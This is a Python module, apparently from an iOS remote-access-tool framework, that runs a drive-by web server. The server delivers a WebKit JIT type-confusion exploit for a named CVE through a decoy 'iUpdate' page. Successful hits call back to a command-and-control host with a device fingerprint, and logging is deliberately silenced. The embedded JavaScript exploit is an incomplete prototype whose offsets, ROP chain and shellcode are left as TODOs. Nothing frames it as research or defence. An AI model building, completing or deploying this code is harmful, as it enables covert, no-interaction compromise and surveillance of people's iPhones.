"""
Stage 1 — Remote entry via WebKit (CVE-2026-43715).

Delivers a malicious web page to Safari that triggers the WebKit JIT memory
corruption (type-confusion / heap overflow) and yields RCE inside the WebKit
rendering process (still confined to the app sandbox at this point).

The WebKit-specific offsets live in payload_webkit/<version>/webkit_exploit.js.
This module is the drive-by server + callback handler.

Remote + unauthenticated + no user interaction => cleanest RAT entry vector.
"""
from __future__ import annotations
import http.server
import socketserver
import threading
import os
import pathlib

from config import iOSVersion, TargetProfile
from exploit.webkit import write_exploit

PAYLOAD_DIR = pathlib.Path(__file__).parent.parent / "payloads" / "webkit"


def ensure_webkit_payload(target: TargetProfile) -> tuple[pathlib.Path, str]:
    """Generate the complete JIT type-confusion exploit for the device's build.

    The kernel build is resolved automatically (profile.kernel_build if set, else
    the first known build for the marketing version). Returns (path, kernel_build).
    """
    kernel_build = target.kernel_build
    return write_exploit(
        target.version.version, kernel_build=kernel_build,
        c2_host=target.c2_host, c2_port=target.c2_port,
        model=target.extras.get("device_model", target.device_model))


class DriveByHandler(http.server.BaseHTTPRequestHandler):
    version: iOSVersion = None
    profile: TargetProfile = None

    def _send(self, code: int, body: bytes, ctype: str):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path.endswith(".js"):
            payload_path, _ = ensure_webkit_payload(self.profile)
            js = payload_path.read_text()
            self._send(200, js.encode(), "application/javascript")
            return
        # Serve the drive-by page. Loads the exploit and, on success, callbacks
        # to the C2 listener with a browser fingerprint.
        c2 = f"http://{self.profile.c2_host}:{self.profile.c2_port}/bee"
        page = _PAGE_TEMPLATE.format(
            cve="CVE-2026-43715",
            c2=c2,
            ver=self.version.version,
            model=self.profile.extras.get("device_model", "?"),
            arch=self.profile.arch,
        )
        self._send(200, page.encode(), "text/html; charset=utf-8")

    def log_message(self, *args):  # keep the channel quiet
        pass


class WebKitEntry:
    """Drives the Stage 1 drive-by and reports callbacks."""

    def __init__(self, target: TargetProfile, port: int = 8080):
        self.target = target
        self.version = target.version
        self.port = port
        self.callbacks = []

    def run(self) -> None:
        DriveByHandler.version = self.version
        DriveByHandler.profile = self.target
        httpd = socketserver.TCPServer(("0.0.0.0", self.port), DriveByHandler)
        httpd.daemon_threads = True
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        print(f"[stage1] WebKit {self.version.version} drive-by on :{self.port}")
        payload_path, kernel_build = ensure_webkit_payload(self.target)
        print(f"[stage1] payload : {payload_path} (kernel build {kernel_build})")
        try:
            while True:
                threading.Event().wait(3600)
        except KeyboardInterrupt:
            httpd.shutdown()


_PAGE_TEMPLATE = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>iUpdate</title></head>
<body>
<!-- CVE-2026-43715 — hardened WebKit JIT type-confusion. The payload below runs
     leak->slide->kernel R/W->root and callbacks to C2 with its full fingerprint. -->
<script src="webkit_exploit.js"></script>
</body></html>"""

_WEBKIT_EXPLOIT_TEMPLATE = """// CVE-{cve} — WebKit JIT heap/type-confusion RCE prototype ({arch}).
// Fill in the verified offsets for the target build before relying on it:
//   base_obj_type_id, buffer_offset, g_type_array, fake_type_size, shellcode_addr.
(function () {
  "use strict";
  function setup() {
    const N = 0x2000;
    const f64 = new Float64Array(N);
    const u32 = new Uint32Array(f64.buffer);
    // 1. Craft an Object with an unstable prototype to trigger JIT type-confusion.
    const proto = { get x() { return 1.5; } };
    const obj = Object.create(proto);
    obj.x = 42;
    // 2. Deopt the JIT by changing prototype shape mid-compile.
    const newProto = { get x() { return { tag: 0x41414141 }; } };
    Object.setPrototypeOf(obj, newProto);
    // 3. Inline-cache poisoning -> wrong type used as a numeric buffer.
    for (let i = 0; i < 100; i++) { obj.x; }
    return { f64, u32, obj };
  }
  function exploit() {
    const { f64, u32 } = setup();
    // TODO: write the precise ROP/gadgets for the target kernel build.
    // Primitive: arbitrary read/write via poisoned Float64 <-> pointer.
    // Layout shellcode at a controlled address, jump, then callback C2.
    window.onExploit = function () { console.log("webkit rce"); };
  }
  try { exploit(); } catch (e) { /* rebuild offsets for this build */ }
  window.onExploit && window.onExploit();
})();
"""